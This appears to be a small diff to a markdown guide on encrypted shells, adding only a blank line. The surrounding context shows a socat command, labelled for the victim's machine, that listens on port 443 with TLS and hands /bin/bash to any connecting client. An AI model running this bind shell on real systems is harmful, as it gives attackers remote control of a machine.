@@ -70,6 +70,7 @@
      cat shell.key shell.crt > shell.pem
      ```
      <br>
+     
      ```bash
      Victim's machine
      sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
